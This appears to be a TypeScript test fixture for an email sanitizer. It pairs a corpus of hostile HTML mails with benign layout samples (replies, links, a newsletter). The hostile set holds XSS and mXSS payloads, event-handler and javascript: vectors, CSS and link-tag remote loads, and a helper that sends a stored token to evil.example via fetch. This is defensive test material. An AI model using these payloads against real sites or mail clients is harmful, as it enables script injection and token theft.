// Synthetic mail only: invented people at .example domains. Every hostile
// vector tries to (a) run script that marks the parent (`top.__pwned`) or
// (b) make a request to evil.example. The tests assert neither happens.

const PWN = (tag: string) =>
  `try{top.__pwned=${JSON.stringify(tag)}}catch(e){};try{parent.__pwned=${JSON.stringify(tag)}}catch(e){};` +
  `try{fetch('https://evil.example/js-${tag}?t='+encodeURIComponent(top.localStorage.getItem('pb-token')))}catch(e){}`;

export interface CorpusMail {
  id: string;
  html: string;
  /** Selector inside the frame to click, if the vector needs a user action. */
  click?: string;
  /** Selector inside the frame to hover. */
  hover?: string;
}

export const HOSTILE: CorpusMail[] = [
  { id: 'script-inline', html: `<p>hi</p><script>${PWN('script')}</script>` },
  { id: 'script-src', html: `<script src="https://evil.example/s.js"></script><p>hi</p>` },
  {
    id: 'on-handlers',
    html:
      `<img src="x" onerror="${PWN('onerror')}">` +
      `<div id="hov" onmouseover="${PWN('hover')}" style="height:40px">hover</div>` +
      `<body onload="${PWN('bodyload')}"><p onclick="${PWN('click')}" id="clk">click me</p>`,
    hover: '#hov',
    click: '#clk',
  },
  {
    id: 'javascript-url',
    html: `<a id="js" href="javascript:${PWN('jsurl')}">open</a>`,
    click: '#js',
  },
  {
    id: 'data-url-link',
    html: `<a id="d" href="data:text/html,<script>${PWN('datalink')}</script>">open</a>`,
    click: '#d',
  },
  {
    id: 'svg',
    html:
      `<svg onload="${PWN('svgload')}"><script>${PWN('svgscript')}</script>` +
      `<image href="https://evil.example/svg-image"/><use href="https://evil.example/svg-use.svg#a"/></svg>`,
  },
  {
    id: 'nested-iframe',
    html:
      `<iframe srcdoc="<script>${PWN('srcdoc').replace(/"/g, '&quot;')}</script>"></iframe>` +
      `<iframe src="https://evil.example/frame"></iframe><frameset><frame src="https://evil.example/frame2"></frameset>`,
  },
  {
    id: 'object-embed',
    html:
      `<object data="https://evil.example/object"></object><embed src="https://evil.example/embed">` +
      `<applet code="x" codebase="https://evil.example/applet"></applet>`,
  },
  {
    id: 'meta-refresh',
    html:
      `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/refresh-head"></head>` +
      `<body><meta http-equiv="refresh" content="0;url=https://evil.example/refresh-body"><p>wait</p></body></html>`,
  },
  {
    id: 'meta-csp-override',
    html: `<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"><img src="https://evil.example/after-override"><script>${PWN('cspoverride')}</script>`,
  },
  {
    id: 'base-href',
    html: `<base href="https://evil.example/"><img src="pixel.gif"><a id="rel" href="relative/page">rel</a>`,
    click: '#rel',
  },
  {
    id: 'form',
    html:
      `<form action="https://evil.example/form" method="post"><input name="a" value="b">` +
      `<button id="go" type="submit">go</button></form>` +
      `<form><button id="go2" formaction="https://evil.example/formaction">go2</button></form>`,
    click: '#go',
  },
  {
    id: 'css-import',
    html:
      `<style>@import url(https://evil.example/import.css);</style>` +
      `<style>@import 'https://evil.example/import2.css';</style><p>x</p>`,
  },
  {
    id: 'css-url',
    html:
      `<style>
        body{background-image:url('https://evil.example/css-bg')}
        .a{background:image-set("https://evil.example/css-imageset" 1x)}
        .b{background:-webkit-image-set(url(https://evil.example/css-wkimageset) 1x)}
        .c{cursor:url(https://evil.example/css-cursor),auto}
        .d{list-style-image:url(https://evil.example/css-list)}
        .e{border-image:url(https://evil.example/css-border) 30 round;border:10px solid}
        .f{mask-image:url(https://evil.example/css-mask);-webkit-mask-image:url(https://evil.example/css-wkmask)}
        .g::before{content:url(https://evil.example/css-content)}
        .h{background:url(//evil.example/css-protorel)}
        .i{background:url(https\\3a //evil.example/css-escaped)}
      </style>` +
      `<div class="a">a</div><div class="b">b</div><div class="c">c</div><ul class="d"><li>d</li></ul>` +
      `<div class="e">e</div><div class="f">f</div><div class="g">g</div><div class="h">h</div><div class="i">i</div>` +
      `<div style="background:url(https://evil.example/inline-bg)">inline</div>` +
      `<div style="background:image-set('https://evil.example/inline-imageset' 1x)">inline2</div>`,
  },
  {
    id: 'font-face',
    html:
      `<style>@font-face{font-family:x;src:url(https://evil.example/font.woff2)} p{font-family:x}` +
      `@font-face{font-family:y;src:local(Arial),url('https://evil.example/font2.woff')} h1{font-family:y}</style><p>x</p><h1>y</h1>`,
  },
  {
    id: 'link-tags',
    html:
      `<link rel="stylesheet" href="https://evil.example/link.css">` +
      `<link rel="prefetch" href="https://evil.example/prefetch">` +
      `<link rel="preload" as="image" href="https://evil.example/preload">` +
      `<link rel="preconnect" href="https://evil.example">` +
      `<link rel="dns-prefetch" href="https://dns.evil.example">` +
      `<link rel="icon" href="https://evil.example/icon">` +
      `<link rel="manifest" href="https://evil.example/manifest">` +
      `<link rel="modulepreload" href="https://evil.example/mod.js"><p>x</p>`,
  },
  {
    id: 'img-srcset',
    html:
      `<img srcset="https://evil.example/srcset 1x, https://evil.example/srcset2 2x">` +
      `<picture><source srcset="https://evil.example/picture"><img alt="p"></picture>` +
      `<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" srcset="https://evil.example/srcset3 1x" sizes="100vw">` +
      `<input type="image" src="https://evil.example/input-image">`,
  },
  {
    id: 'media',
    html:
      `<video poster="https://evil.example/poster" src="https://evil.example/video.mp4" autoplay></video>` +
      `<video><source src="https://evil.example/source.mp4"><track src="https://evil.example/track.vtt"></video>` +
      `<audio src="https://evil.example/audio.mp3" autoplay></audio>`,
  },
  {
    id: 'background-attr',
    html:
      `<table background="https://evil.example/table-bg"><tr><td background="https://evil.example/td-bg">x</td></tr></table>` +
      `<body background="https://evil.example/body-bg"><p>x</p>`,
  },
  {
    id: 'remote-img',
    html: `<p>Hero:</p><img src="https://images.example/hero.png" width="600" height="300">`,
  },
  {
    id: 'ping-and-targets',
    html:
      `<a id="ping" href="https://links.example/ok" ping="https://evil.example/ping">ping</a> ` +
      `<a id="blank" href="https://links.example/blank" target="_blank">blank</a> ` +
      `<a id="top" href="https://links.example/top" target="_top">top</a> ` +
      `<area id="area" href="https://evil.example/area">`,
    click: '#ping',
  },
  {
    id: 'style-parent',
    html:
      `<style>body,html{background:red!important}#parent-marker{display:none!important}` +
      `*{color:red!important}</style><p>styled</p>`,
  },
  {
    id: 'mxss-noscript',
    html: `<noscript><p title="</noscript><img src=x onerror=${PWN('noscript').replace(/"/g, '')}>"></p></noscript>`,
  },
  {
    id: 'mxss-math',
    html:
      `<math><mtext><table><mglyph><style><img src=x onerror="${PWN('math')}"></style></mglyph></table></mtext></math>` +
      `<svg></p><style><a id="</style><img src=1 onerror=${PWN('svgstyle').replace(/"/g, '')}>">`,
  },
  {
    id: 'srcdoc-breakout',
    html: `"></iframe><script>${PWN('breakout')}</script><iframe src="https://evil.example/breakout">`,
  },
  {
    id: 'trackers',
    html:
      `<p>Hello</p>` +
      `<img src="https://evil.example/pixel.gif" width="1" height="1">` +
      `<img src="https://evil.example/hidden.gif" style="display:none">` +
      `<img src="https://us1.list-manage.com/track/open.php?u=1">`,
  },
];

// ---------------------------------------------------------------- functional

const para = (i: number) =>
  `<p>Paragraph ${i}. The quarterly planning notes for the garden club are attached below; ` +
  `please bring your seed catalogues and the volunteer rota to the next meeting at the library.</p>`;

export const FUNCTIONAL: Record<string, string> = {
  long: Array.from({ length: 80 }, (_, i) => para(i + 1)).join(''),

  // A remote image that arrives late (the test delays the proxy's answer).
  'late-image':
    `<p>Before the image.</p><img src="https://images.example/late.png" alt="hero"><p>After the image.</p>`,

  // Gmail shape after sanitization: classes are gone, structure remains.
  'gmail-reply':
    `<div dir="ltr">Sounds good, see you Thursday.</div><br>` +
    `<div><div dir="ltr">On Mon, Mar 2, 2026 at 9:14 AM Ann Example &lt;ann@mail.example&gt; wrote:<br></div>` +
    `<blockquote style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">` +
    `<div dir="ltr">Can we move the review to Thursday?</div>` +
    `<blockquote><div>Earlier history that is nested.</div></blockquote></blockquote></div>`,

  // Apple Mail / plain attribution paragraph.
  'wrote-reply':
    `<p>Thanks, that works for me.</p><p>Bo</p>` +
    `<p>On Tue, Mar 3, 2026, at 10:02, Cy Example wrote:</p>` +
    `<blockquote type="cite"><p>Here is the draft for your review.</p><p>Cy</p></blockquote>`,

  // Bottom-posted: substantial text after the quote. Must NOT collapse.
  'bottom-posted':
    `<p>On Tue, Mar 3, 2026, at 10:02, Cy Example wrote:</p><blockquote><p>Question one?</p></blockquote>` +
    Array.from({ length: 4 }, (_, i) => para(i)).join(''),

  links:
    `<p><a id="https" href="https://links.example/a">https</a> <a id="http" href="http://links.example/b">http</a> ` +
    `<a id="mailto" href="mailto:dee@mail.example">mail</a> <a id="ftp" href="ftp://files.example/x">ftp</a> ` +
    `<a id="rel" href="/relative">relative</a> <a id="hash" href="#top">hash</a> ` +
    `<a id="nested" href="https://links.example/nested"><span><b id="inner">nested</b></span></a></p>`,
};

/** A large table-built newsletter, roughly 200KB of markup. */
export function newsletter(): string {
  const row = (i: number) =>
    `<tr><td style="padding:12px 24px;font-family:Georgia,serif;font-size:16px;color:#333" width="600">` +
    `<h2 style="margin:0 0 8px;font-size:20px">Story ${i}: the harbour festival returns</h2>` +
    `<p style="margin:0 0 8px">Organisers expect record crowds this year, with boat races, a food market ` +
    `and an evening lantern parade along the seafront. Tickets go on sale next week.</p>` +
    `<table width="100%" cellpadding="0" cellspacing="0"><tr>` +
    `<td bgcolor="#f2f2f2" style="padding:8px"><a href="https://news.example/story/${i}" style="color:#0a58ca">Read more</a></td>` +
    `<td align="right" style="padding:8px;font-size:12px;color:#888">${i} min read</td></tr></table></td></tr>`;
  return (
    `<table width="600" align="center" cellpadding="0" cellspacing="0" bgcolor="#ffffff" ` +
    `style="max-width:600px;margin:0 auto;border:1px solid #eee">` +
    Array.from({ length: 220 }, (_, i) => row(i + 1)).join('') +
    `</table>`
  );
}
